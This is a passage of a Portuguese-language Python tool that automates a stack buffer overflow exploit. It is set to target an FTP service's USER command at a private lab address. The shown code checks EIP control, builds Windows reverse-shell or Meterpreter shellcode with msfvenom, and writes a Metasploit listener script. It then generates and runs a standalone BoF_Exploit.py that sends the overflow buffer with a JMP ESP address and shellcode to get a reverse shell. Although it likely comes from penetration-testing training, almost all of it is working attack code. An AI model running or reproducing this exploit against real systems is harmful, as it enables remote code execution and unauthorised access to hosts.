    if _BYTES_OVERFLOW == 0:
        define_ruptura("_BUFFER_OVERFLOW")
        _EIP_VALUE = _BYTES_OVERFLOW + 4

    if _SHELLCODE_SIZE == 0: define_ruptura("_SHELLCODE_SIZE")

    if _JUMP == "":
        define_jmp()
    else:
        while True:
            _QUESTION_ = input(f"{_YELLOW}DESEJA MANTER O VALOR RELACIONADO AO {_RED}ESP {_YELLOW}({_RED}{_JUMP}{_YELLOW})? ({_GREEN}S{_YELLOW}/{_RED}N{_YELLOW}) {_DEFAULT_COLOR}").upper()
            if _QUESTION_ == "N":
                _JUMP = define_jmp()
                break
            if _QUESTION_ == "S":
                break
    #77e2eba3
    _ENCODED_JUMP_ = str(struct.pack('<I', int(_JUMP,16))).encode().decode('unicode-escape')[2:-1]
    _STRING_ = ('A' * _BYTES_OVERFLOW + _ENCODED_JUMP_ + '\xcc' * 20 + 'C' * _SHELLCODE_SIZE)
    input(f"{_YELLOW}PRESSIONE {_GREEN}ENTER{_YELLOW} PARA CONTINUAR...{_DEFAULT_COLOR}")

    _CONNECTION_ = conecta()
    if _CONNECTION_ == 0:
        try:
            envia(_STRING_)
            _CONN.close()
            divisao()
        except Exception:
            while True:
                _QUESTION = input(f"{_YELLOW}VERIFICQUE SE A APLICAÇÃO PAROU EXATAMENTE NOS {_GREEN}" + r"\xcc" + f"{_YELLOW}: ({_GREEN}S{_YELLOW}/{_RED}N{_YELLOW}) {_DEFAULT_COLOR}").upper()
                divisao()
                if _QUESTION == "S":
                    print(f"{_GREEN}OK! TEMOS O CONTROLE SOBRE O EIP!{_DEFAULT_COLOR}")
                    _EIP_CONTROL = "SIM"
                    divisao()
                    input(f"{_YELLOW}PRESSIONE {_GREEN}ENTER{_YELLOW} PARA RETORNAR AO MENU...{_DEFAULT_COLOR}")
                    return "MENU"
                if _QUESTION == "N":
                    if pergunta(f"{_RED}VERIFIQUE OS PARÂMETROS DE ENTRADA!!{_DEFAULT_COLOR}") == 1:
                        return 1
                    return 0    
    else:
        return _CONNECTION_    
# =======================================================================================================================

def shellcode():  # FUNÇÃO PARA GERAR O SHELLCODE
    clear()
    titulo("PARÂMETROS PARA GERAR O SHELLCODE")
    global _BAD_CHARS, _SHELLCODE_STRING, _SHELLCODE

    while True:
        _IP_ = input(f"{_YELLOW}DIGITE O {_GREEN}IP{_YELLOW} DO {_GREEN}ATACANTE{_YELLOW}: {_DEFAULT_COLOR}")
        try:
            ipaddress.ip_address(_IP_)
            break
        except Exception:
            print(f"{_RED}[!] IP inválido! Digite o IP corretamente!!{_DEFAULT_COLOR}")

    while True:
        _ATTACKER_PORT_ = input(f"{_YELLOW}DIGITE A {_GREEN}PORTA{_YELLOW} DO {_GREEN}ATACANTE{_YELLOW}: {_DEFAULT_COLOR}")
        if _ATTACKER_PORT_.isnumeric() and 1 <= int(_ATTACKER_PORT_) <= 65535:
            break
        else:
            print(f"{_RED}Porta inválida! Digite portas entre 1 e 65535!{_DEFAULT_COLOR}")

    while True:
        _TYPE_ = input(f"{_YELLOW}CRIAR EXPLOIT COM PAYLOAD NORMAL OU COM METERPRETER ({_RED}N{_YELLOW}/{_GREEN}M{_YELLOW}) \033[m").upper()
        divisao()
        if _TYPE_ == "N":
            print("Construindo Shellcode...")
            print("\nmsfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=" + _IP_ + " LPORT=" + _ATTACKER_PORT_ + " -f c -e x86/shikata_ga_nai -b '" + _BAD_CHARS + "' EXITFUNC=thread 2> /dev/null\n")
            _SHELLCODE_STRING = os.popen("msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp LHOST=" + _IP_ + " LPORT=" + _ATTACKER_PORT_ + " -f c -e x86/shikata_ga_nai -b '" + _BAD_CHARS + "' EXITFUNC=thread 2> /dev/null").read()
            print(_SHELLCODE_STRING)
            divisao()
            print(f"{_GREEN}EXECUTE O COMANDO {_RED}'nc -nlvp {_ATTACKER_PORT_}'{_GREEN} E VÁ PARA O ITEM {_RED}8{_GREEN} NO MENU{_DEFAULT_COLOR}")
            break
        elif _TYPE_ == "M":
            print("Construindo Shellcode...")
            print("\nmsfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=" + _IP_ + " LPORT=" + _ATTACKER_PORT_ + " -f c -e x86/shikata_ga_nai -b '" + _BAD_CHARS + "' EXITFUNC=thread 2> /dev/null\n")
            _SHELLCODE_STRING = os.popen("msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=" + _IP_ + " LPORT=" + _ATTACKER_PORT_ + " -f c -e x86/shikata_ga_nai -b '" + _BAD_CHARS + "' EXITFUNC=thread 2> /dev/null").read()
            print(_SHELLCODE_STRING)
            with open("escuta.rc", "w") as file:
                file.write("use exploit/multi/handler\n")
                file.write("set payload windows/meterpreter/reverse_tcp\n")
                file.write("set lhost {}\n".format(_IP_))
                file.write("set lport {}\n".format(_ATTACKER_PORT_))
                file.write("set exitfunc none\n")
                file.write("run")
            file.close()
            divisao()
            print(f"{_GREEN}EXECUTE O COMANDO {_RED}'msfconsole -r escuta.rc'{_GREEN} E VÁ PARA O ITEM {_RED}8{_GREEN} NO MENU{_DEFAULT_COLOR}")
            break

    _SHELLCODE_STRING = str(_SHELLCODE_STRING[23:-2])
    #_SHELLCODE_STRING = "PAYLOAD = (" + _SHELLCODE_STRING + ")"
    divisao()
    _SHELLCODE = 1
    input(f"{_YELLOW}PRESSIONE {_GREEN}ENTER{_YELLOW} PARA RETORNAR AO MENU...{_DEFAULT_COLOR}")
    return "MENU"
# =======================================================================================================================

def exploit():
    clear()
    titulo("EXPLOIT!!!")
    global _EXPL_PARAMETER, _PARAMETERS, _BYTES_OVERFLOW, _BAD_CHARS, _SHELLCODE_STRING, _JUMP, _SHELLCODE

    if _SHELLCODE == 0:
        print(f"\n{_RED}AINDA NÃO FOI GERADO O SHELLCODE! EXECUTE O ITEM {_GREEN}7{_RED} ANTES DE EXECUTAR O EXPLOIT!{_DEFAULT_COLOR}")
        input(f"{_YELLOW}\nPRESSIONE {_GREEN}ENTER{_YELLOW} PARA RETORNAR AO MENU...{_DEFAULT_COLOR}")
        return "MENU"

    # VERIFICA SE OS DADOS DO ALVO JÁ FORAM DIGITADOS
    if _HOST == "" or _PORT == 0: define_parametros()
    else: exibe_parametros()
    
    divisao()

    if _BYTES_OVERFLOW == 0:
        define_ruptura("_BUFFER_OVERFLOW")
        _EIP_VALUE = _BYTES_OVERFLOW + 4

    if _JUMP == "":
        define_jmp()
    else:
        while True:
            _QUESTION_ = input(f"{_YELLOW}DESEJA MANTER O VALOR RELACIONADO AO {_RED}ESP {_YELLOW}({_RED}{_JUMP}{_YELLOW})? ({_GREEN}S{_YELLOW}/{_RED}N{_YELLOW}) {_DEFAULT_COLOR}").upper()
            if _QUESTION_ == "N":
                define_jmp()
                break
            if _QUESTION_ == "S":
                break
    #77e2eba3
    
    print(f"_JUMP: {_JUMP} - {type(_JUMP)}")
    
    _ENCODED_JUMP_ = str(struct.pack('<I', int(_JUMP,16))).encode().decode('unicode-escape')[2:-1]
    print("2")
    _STRING_ = ('A' * _BYTES_OVERFLOW + _ENCODED_JUMP_ + '\xcc' * 20 + 'C' * _SHELLCODE_SIZE)
    print("3")
    divisao()

    # ESCREVENDO O ARQUIVO DE EXPLOIT
    with open("BoF_Exploit.py", "w") as f:
        f.write("#!/usr/bin/env python3\n\n")
        f.write("import socket\n\n")
        f.write("from time import sleep\n\n")
        f.write(f"_HOST = '{_HOST}'\n")
        f.write(f"_PORT = {_PORT}\n")
        f.write(f"_PARAMETER = '{_EXPL_PARAMETER}'\n")
        f.write(f"_BYTES_OVERFLOW = {_BYTES_OVERFLOW}\n")
        f.write(f"_JUMP = '{_JUMP}'\n")
        f.write(f"_ENCODED_JUMP_ = '{_ENCODED_JUMP_}'\n")
        f.write(f"_NOP = '\\x90' * 20\n\n")
        f.write(f"_SHELLCODE_STRING = ({_SHELLCODE_STRING})\n\n")
        f.write("_BUFFER = 'A' * _BYTES_OVERFLOW + _ENCODED_JUMP_ + _NOP + _SHELLCODE_STRING\n\n")
        f.write("try:\n")
        f.write("   print('\\033[1;33mENVIANDO EXPLOIT...\\033[m')\n")
        f.write("   _CONN = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n")
        f.write(f"   _CONN.settimeout({_TIMEOUT})\n")
        f.write("   _CONN.connect((_HOST, _PORT))\n")

        if _BANNER == "S":
            f.write("   sleep(1)\n")
            f.write("   _ANSWER = _CONN.recv(1024)\n\n")

        for _PARAMETER_ in _PARAMETERS:
            if _PARAMETER_ == _EXPL_PARAMETER:
                f.write(f"   _CONN.send(('{_PARAMETER_}' + \' \' + _BUFFER  + '\\r\\n').encode('latin-1'))\n")
            else:
                f.write(f"   _CONN.send(('{_PARAMETER_}' + ' anonymous\\r\\n').encode('latin-1'))\n")
            
            f.write("   sleep(1)\n")
            
            if _BANNER == 'S':
                f.write("   _ANSWER = _CONN.recv(1024)\n\n")

        f.write("except Exception:\n")
        f.write("   exit()\n")

    f.close()

    print(f"{_GREEN}ARQUIVO {_RED}BoF_Exploit.py{_GREEN} GERADO COM SUCESSO!! EXECUTANDO EXPLOIT...\n{_DEFAULT_COLOR}")
    os.system("python3 BoF_Exploit.py")
    print(f"{_GREEN}EXPLOIT ENVIADO!{_YELLOW} VERIFIQUE SE O SHELL REVERSO FOI OBTIDO!{_DEFAULT_COLOR}")
    divisao()
    print(f"{_YELLOW}FUTURAMENTE, CASO OS {_RED}PARÂMETROS DO ALVO PERMANECAM OS MESMOS{_GREEN}, APENAS EXECUTE O ARQUIVO {_RED}BoF_Exploit.py{_GREEN} PARA CONSEGUIR O SHELL!{_DEFAULT_COLOR}")
    divisao()
    input(f"{_YELLOW}PRESSIONE {_GREEN}ENTER{_YELLOW} PARA RETORNAR AO MENU...{_DEFAULT_COLOR}")
    return "MENU"
# =======================================================================================================================

# INICIO DO MAIN
# DEFINICAO DE VARIAVEIS GLOBAIS
_HOST = ""
_PARAMETERS = []
_EXPL_PARAMETER = ""
_BANNER = ""
_BAD_CHARS = r"\x00\x0a\x0d"
_EIP_CONTROL = ""
_SHELLCODE_STRING = ""
_JUMP = ""
_CONN = ""
_PORT = 0
_CRASH = 0
_BYTES_OVERFLOW = 0
_EIP_VALUE = 0
_TIMEOUT = 5
_SHELLCODE_SIZE = 0
_SHELLCODE = 0

# VARIÁVEIS LOCAIS
_CHOICE_ = 0
_RETURN_FUNCTION_ = {}

# CORES
_DEFAULT_COLOR = "\033[m"
_GREEN = "\033[1;32m"
_RED = "\033[1;31m"
_YELLOW = "\033[1;33m"

_HOST = '192.168.238.129'
_PORT = 21
_PARAMETERS = ['USER','PASS']
_EXPL_PARAMETER = 'USER'
_BANNER = 'S'
_TIMEOUT = 1
_CRASH = 246
_BYTES_OVERFLOW = 230

_TEXT_MENU = ['FUZZY',
              'VERIFICAR PONTO DE RUPTURA',
              'BYTES PARA SOBRESCREVER O EIP',
              'VERIFICAR ESPAÇO PARA O SHELLCODE',
              'TESTAR BAD CHARS',
              'VERIFICAR O CONTROLE DO EIP',
              'GERAR O SHELLCODE',
              'EXPLOIT!!!',
              'SAIR DO PROGRAMA']

_MENU_OPTIONS = ['fuzzy()',
                 'ruptura()',
                 'eip()',
                 'espaco()',
                 'badchar()',
                 'controle()',
                 'shellcode()',
                 'exploit()',
                 'exit(0)']

# LAÇO QUE CRIA A TELA PRINCIPAL COM O MENU E INFORMAÇÕES DO ALVO
while True:
    clear()
    titulo("SCRIPT BUFFER OVERFLOW - BY DANIEL DOMINGUES")
    # LAÇO QUE CRIA O MENU PROPRIAMENTE DITO
    for _ITEM in range(9):
        if int(_CHOICE_) >= _ITEM + 1:
            print(f"[ {_GREEN}{_ITEM + 1}{_DEFAULT_COLOR} ] {_TEXT_MENU[_ITEM]}")
        else:
            print(f"[ {_ITEM + 1} ] {_TEXT_MENU[_ITEM]}")

    print("\n\n")
    titulo("INFORMACOES SOBRE O ALVO")
    print(f"IP: {_GREEN}{_HOST}{_DEFAULT_COLOR}")
    print(f"PORTA: {_GREEN}{_PORT}{_DEFAULT_COLOR}")
    print(f"PARÂMETRO EXPLOITÁVEL: {_GREEN}{_EXPL_PARAMETER}{_DEFAULT_COLOR}")
    print(f"CRASH COM FUZZY: {_GREEN}{_CRASH}{_DEFAULT_COLOR}")
    print(f"PONTO DE RUPTURA: {_GREEN}{_BYTES_OVERFLOW}{_DEFAULT_COLOR}")
    print(f"SOBRESCREVER EIP: {_GREEN}{_EIP_VALUE}{_DEFAULT_COLOR}")
    print(f"BAD CHARS: {_GREEN}{_BAD_CHARS}{_DEFAULT_COLOR}")
    print(f"CONTROLE DO EIP: {_GREEN}{_EIP_CONTROL}{_DEFAULT_COLOR}")
    print(f"JMP ESP: {_GREEN}{_JUMP.upper()}{_DEFAULT_COLOR}")

    print(f"\033[13;0H{_YELLOW}ESCOLHA UMA OPÇÃO (1 a 9): \033[m\033[13;28H", end="")
    _CHOICE_ = input("")
    try:
        while True:
            if 1 <= int(_CHOICE_) <= 9:
                exec(f"_INDEX = {_MENU_OPTIONS[int(_CHOICE_) - 1]}", None, _RETURN_FUNCTION_)
                if _RETURN_FUNCTION_['_INDEX'] == "MENU":
                    break
            else:
                input(f'{_RED}OPÇÃO INVÁLIDA! DIGITE APENAS NÚMEROS DE 1 A {len(_TEXT_MENU)}!{_DEFAULT_COLOR}')
                _CHOICE = 0
    except Exception as erro:
        print(f"Erro: {erro}", end=" ")
        input(f'{_RED}DIGITE APENAS NÚMEROS DE 1 A {len(_TEXT_MENU)}!{_DEFAULT_COLOR}')
        _CHOICE = 0
